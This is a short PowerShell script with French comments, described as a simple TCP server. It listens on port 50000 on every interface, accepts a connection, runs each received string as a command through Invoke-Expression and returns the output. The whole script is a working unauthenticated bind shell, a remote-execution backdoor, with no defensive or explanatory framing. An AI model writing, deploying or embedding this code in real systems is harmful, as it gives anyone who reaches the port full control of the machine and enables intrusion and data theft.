# Définir le port sur lequel le serveur écoutera les connexions
$port = 50000

# Créer un objet de socket TCP pour le serveur
$tcpListener = New-Object System.Net.Sockets.TcpListener([System.Net.IPAddress]::Any, $port)

# Démarrer l'écoute du serveur
$tcpListener.Start()
Write-Host "Serveur en écoute sur le port $port"

# Accepter une connexion entrante
$tcpClient = $tcpListener.AcceptTcpClient()
Write-Host "Connexion entrante acceptée"

# Vous pouvez maintenant envoyer et recevoir des données via le $tcpClient
while($true)
{
    # Exemple de réception de données
    $buffer = New-Object byte[] 9999
    try{
        $bytesRead = $tcpClient.GetStream().Read($buffer, 0, $buffer.Length)
    }
    catch{exit}
    
    $receivedData = [System.Text.Encoding]::ASCII.GetString($buffer, 0, $bytesRead)

    Write-Host "Données reçues du client : $receivedData"

    Invoke-Command -ScriptBlock {iex $receivedData} | Out-String -OutVariable resultCommand
    
    # Exemple d'envoi de données
    $dataToSendBytes = [System.Text.Encoding]::ASCII.GetBytes(($resultCommand).ToCharArray())
    $tcpClient.GetStream().Write($dataToSendBytes, 0, $dataToSendBytes.Length)
}
# Fermer la connexion
$tcpClient.Close()

# Arrêter l'écoute du serveur
$tcpListener.Stop()
Write-Host "Serveur arrêté"